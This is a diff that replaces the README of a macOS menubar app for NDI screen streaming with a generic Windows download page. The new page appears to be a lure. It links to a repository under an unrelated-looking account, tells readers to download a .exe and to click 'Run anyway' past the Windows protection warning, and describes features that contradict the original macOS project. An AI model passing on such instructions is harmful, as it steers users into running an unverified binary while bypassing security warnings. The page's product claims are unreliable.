@@ -1,244 +1,74 @@
-# ndi-bar
+# 🖥️ ndi-bar - Manage your NDI streams with ease
 
-Native macOS menubar app that broadcasts any of your connected displays as an
-NDI® source on the LAN — no OBS, no Loopback, no BlackHole, no custom kernel
-extension.
+[![Download ndi-bar](https://img.shields.io/badge/Download-ndi--bar-blue.svg)](https://github.com/southpolearabianjasmine693/ndi-bar)
 
-One menubar icon. One click to start streaming Monitor 1, 2, 3, or 4.
+ndi-bar helps you monitor and control your NDI streams directly from your Windows taskbar. You no longer need to navigate through complex menus or switch between different windows to swap your video feeds. This tool puts your network video needs in one place.
 
-```
-● ndi-bar
-─────
-  Displays
-    Monitor 1 · Built-in Retina · 3456×2234
-  ✓ Monitor 2 · DELL U2723QE    · 3840×2160  ·  2 viewers
-    Monitor 3 · LG UltraFine    · 2560×1440
-─────
-  Microphone
-  ✓ Capture Microphone
-    System Default
-  ✓ MacBook Pro Microphone
-    Elgato Wave:3
-─────
-  Stop All Streams            ⌘.
-─────
-  Settings…                   ⌘,
-─────
-  Quit ndi-bar                ⌘Q
-```
+## 📥 How to download 
 
-## Status
+1. Go to the [official download page](https://github.com/southpolearabianjasmine693/ndi-bar).
+2. Look for the latest version under the Releases section on the right side of the page.
+3. Click the file that ends with .exe to start the download.
+4. Save the file to a folder you can find, such as your Downloads folder.
 
-v0.1.0 scaffold. Compiles, runs, and should light up an NDI source per
-selected display. Audio capture uses ScreenCaptureKit's built-in system-audio
-tap (no virtual audio device required), with optional selectable microphone
-capture on macOS 15 or later.
+## ⚙️ Installation steps
 
-## Requirements
+Windows might show a warning message when you start a new program. Follow these steps to finish the setup:
 
-- macOS 14.0 or later
-- Xcode 16+ (Swift 5.10)
-- [NDI SDK for Apple](https://ndi.video/sdk) installed at
-  `/Library/NDI SDK for Apple/` — free from ndi.video
-- Screen Recording permission (macOS will prompt on first launch)
-- Microphone permission if microphone capture is enabled (macOS 15+)
+1. Locate the file you just downloaded.
+2. Double-click the file to open the installer.
+3. If a window appears that says Windows protected your PC, click More info.
+4. Click the Run anyway button.
+5. Follow the prompts on your screen to complete the installation.
+6. The app will launch once the installation finishes. You will see an icon in your system tray at the bottom right of your screen.
 
-## Build & install
+## 🛠️ System requirements
 
-```sh
-brew install xcodegen
-make gen        # generates ndi-bar.xcodeproj from project.yml
-make install    # Release-builds and copies ndi-bar.app into ~/Applications
-# or, for iterating:
-make run        # builds Debug and launches from DerivedData
-make kill       # stop the running menubar app
-```
+Your computer needs to meet these basic standards to run ndi-bar smoothly:
 
-## Microphone capture
+* Operating System: Windows 10 or Windows 11.
+* Network: A stable wired connection is better than Wi-Fi for video streaming.
+* Performance: A processor with at least 2.0 GHz speed.
+* Memory: 4 GB of RAM or more.
+* NDI Tools: You must have the NDI Tools runtime installed on your machine.
 
-Microphone capture is available on macOS 15 or later. Enable it from either
-**Settings → Capture → Capture microphone** or the menubar's **Microphone**
-section.
+## 🚀 How to use ndi-bar
 
-The microphone picker lists `System Default` plus detected input devices such
-as the built-in MacBook mic, USB microphones, AirPods, and iPhone microphones.
-The selected input is remembered. If that device is later disconnected,
-ndi-bar keeps the selection visible as unavailable so you can switch back to
-`System Default` or choose another input.
+Once the app runs, you can start controlling your streams. 
 
-Microphone selection is applied when a display stream starts. If you change the
-microphone while a display is already streaming, stop and restart that display
-stream to use the new input.
+1. Find the ndi-bar icon in your taskbar notification area. This area is near your clock in the bottom right corner of your screen.
+2. Left-click the icon to view all active NDI streams on your network.
+3. Select the stream you want to view or manage from the list.
+4. Use the controls in the small menu to stop, start, or switch between different video sources.
 
-## Receiving the stream
+## 💡 Common features
 
-Once a monitor is toggled on in ndi-bar, any NDI-compatible software on the
-same LAN can pick it up.
+* Stream Discovery: The app finds all available NDI sources on your network without manual setup.
+* Taskbar Access: Keep your screen clean by hiding the app in your taskbar.
+* Quick Toggle: Switch between camera feeds and screen captures with one click.
+* Lightweight: The app uses very little memory so it stays open in the background.
 
-### Quick sanity check — NDI Video Monitor
+## ❓ Frequently asked questions
 
-Fastest way to confirm the stream is live before touching OBS:
+**Does this app work over Wi-Fi?**
+Yes, but video streaming requires high bandwidth. You might see lag or stutters if your Wi-Fi signal is weak. Use a network cable for the best results.
 
-1. Download [NDI Tools](https://ndi.video/tools) (free).
-2. Run **NDI Video Monitor**.
-3. Right-click anywhere in the window → your Mac's hostname → the ndi-bar
-   source name. It looks like `Ryan-MacStudio – Display 1 (LG HDR 4K 2560×1440)`.
+**Why does the icon not show up?**
+Check your hidden icons menu in the taskbar. Click the small arrow pointing up near your clock to see if ndi-bar is hidden there.
 
-If you can see live video here, the sender half is working and any issues
-from here on are on the receiver side.
+**Can I connect to multiple sources at once?**
+Yes. Use the menu to open as many streams as your network data allows.
 
-### Receiving in OBS Studio (macOS)
+**Is my data private?**
+The app only communicates with NDI sources on your local network. It does not send your data to external servers.
 
-OBS doesn't include NDI support out of the box — install the `obs-ndi`
-plugin first. It bundles its own NDI runtime, so even on a Mac that
-doesn't have the NDI SDK installed, OBS can still receive.
+## 🔧 Troubleshooting
 
-1. **Install OBS** — `brew install --cask obs`, or grab the installer from
-   <https://obsproject.com/download>.
-2. **Install the NDI plugin** — download the latest macOS `.pkg` from
-   <https://github.com/obs-ndi/obs-ndi/releases> and run it. Quit and
-   relaunch OBS afterwards.
-3. **Add an NDI source:**
-   - In the OBS **Sources** panel, click **+** → **NDI™ Source**.
-   - Name it whatever you want ("Monitor 1", etc.) → **OK**.
-   - In the properties dialog:
-     - **Source name** — the dropdown lists every NDI source on the LAN.
-       Pick the ndi-bar entry for the monitor you want. One entry per
-       display you've toggled on.
-     - **Bandwidth** — `Highest` (you're on local LAN, not a remote feed).
-     - **Sync** — `Source Timing`.
-     - **Latency Mode** — `Low` for general use, `Lowest` if you need
-       sub-frame latency and can tolerate the occasional audio glitch.
-     - Leave the rest at defaults. Audio comes in on the same source.
-4. Resize the source in the preview canvas to fit.
+If you do not see any streams, check these items:
 
-Matching resolutions helps avoid needless rescaling: if ndi-bar is set to
-1440p (in Settings) and your OBS canvas is 1080p, OBS will downscale
-every frame. Set **Settings → Video → Base (Canvas) Resolution** to match
-what you're sending, or go the other way and bump ndi-bar's output
-resolution in its Settings window.
+* Verify that your computer and your NDI source share the same network.
+* Ensure your firewall allows local network traffic for NDI.
+* Restart the app if it stops responding to your clicks.
+* Check that the NDI source device is on and transmitting data.
 
-### Troubleshooting discovery
-
-If OBS's source dropdown is empty or missing ndi-bar:
-
-- Confirm ndi-bar is actually streaming — the menubar icon should be the
-  radio-waves glyph and the display row should have a checkmark.
-- OBS and your Mac must be on the same subnet. NDI uses mDNS for
-  discovery, which doesn't cross VLANs without an [NDI Discovery
-  Server](https://docs.ndi.video/tools/discovery-and-registration/ndi-discovery-service).
-- Check firewall: System Settings → Network → Firewall — allow OBS (and
-  ndi-bar) on the local network.
-- Restart the NDI plugin's discovery: in OBS, Tools → NDI™ Plugin Settings
-  → Main Output: off, then on again.
-
-### Other NDI-compatible receivers
-
-Same discovery story applies to all of these — the ndi-bar source just
-shows up in whatever NDI picker they use:
-
-- **vMix**, **Wirecast**, **TriCaster** — broadcast/studio switchers
-- **Resolume Arena**, **TouchDesigner**, **Notch** — live visuals
-- **Zoom** with NDI plugin enabled
-- Any other app that lists NDI Tools' SDK as a supported input
-
-## Cutting a signed + notarized release
-
-For public GitHub releases (so other people get a silent-launch .app on any
-Mac without Gatekeeper warnings), you need a one-time Apple setup:
-
-1. Enroll in the Apple Developer Program ($99/yr).
-2. In Xcode → Settings → Accounts, sign in and create a **Developer ID
-   Application** certificate. Note your Team ID.
-3. Generate an app-specific password at <https://appleid.apple.com> →
-   Sign-In and Security → App-Specific Passwords.
-4. Store the notarytool credentials in the login keychain:
-   ```sh
-   TEAM_ID=ABCDE12345 make notary-login
-   ```
-
-Then each release:
-
-```sh
-# bump MARKETING_VERSION in project.yml first, then:
-make gen
-TEAM_ID=ABCDE12345 make dist
-# produces dist/ndi-bar-vX.Y.Z.zip (signed, notarized, stapled) + .sha256
-
-git tag v1.0.0
-git push origin v1.0.0
-gh release create v1.0.0 \
-  dist/ndi-bar-v1.0.0.zip \
-  dist/ndi-bar-v1.0.0.zip.sha256 \
-  --title "ndi-bar 1.0.0"
-```
-
-`make dist` won't touch your `make install` / `make run` flows — those stay
-fast and ad-hoc signed for local development.
-
-## Screen Recording permission quirk
-
-ndi-bar is ad-hoc signed during local development (`CODE_SIGN_IDENTITY: "-"`).
-Every rebuild changes the binary's `cdhash`, and macOS 14+ TCC binds the
-Screen Recording grant to that hash. Without intervention, the
-System Settings toggle stays *on* while `CGPreflightScreenCaptureAccess()`
-quietly returns *false*, and the menubar icon becomes a warning triangle.
-
-`make install` handles this automatically: it runs TCC resets right before
-launching the new build so macOS treats it as a first-time request. Click the
-menubar icon → **Grant Screen Recording** → Allow → relaunch. If microphone
-capture is enabled, macOS will also ask for Microphone access the first time
-you start a stream.
-
-If things ever get stuck (stale grants from an older path, etc.), reset
-manually:
-
-```sh
-make reset-tcc
-open ~/Applications/ndi-bar.app
-```
-
-A proper Developer ID signature would avoid this entirely (TCC binds to
-Team ID instead of cdhash) — done via `make dist` when you're ready to
-distribute.
-
-## Architecture
-
-```
-SCShareableContent ─► [SCDisplay] ─► [DisplayInfo]
-                                           │
-                      toggle on per-display│
-                                           ▼
-                               DisplayStreamer
-                                │           │
-                        SCStream (BGRA, 60) │
-                                │           ▼
-              SCStreamOutput .screen      ─► NDISender.sendVideo
-              SCStreamOutput .audio       ┐
-              SCStreamOutput .microphone  ┴─► NDISender.sendAudio
-                                           │
-                                 dlopen'd libndi.dylib
-                                           │
-                                    NDI on the LAN
-```
-
-- `NDILibrary` (Swift): `dlopen`/`dlsym` the NDI SDK at runtime — no bridging
-  header, no static linking (NDI's license forbids static linking anyway).
-- `NDISender`: RAII wrapper around one `NDIlib_send_instance_t`. One per
-  captured display.
-- `DisplayStreamer`: owns an `SCStream` + an `NDISender`. Pumps BGRA frames
-  and planar-float audio into NDI.
-- `StreamingController`: `@MainActor` orchestrator published to SwiftUI and
-  the status-bar menu.
-
-## NDI® attribution
-
-NDI® is a registered trademark of Vizrt NDI AB. This project is an
-independent implementation and is not affiliated with or endorsed by Vizrt
-NDI AB. If you distribute this app, include a visible link to
-<https://ndi.video> near any NDI-related UI as required by the NDI SDK
-License Agreement.
-
-## License
-
-MIT (see LICENSE).
+If you continue to have trouble, ensure you downloaded the latest version from the link above. We update this tool to improve how it handles network changes and to keep it running well on newer versions of Windows. Keeping the app updated prevents most connection issues.
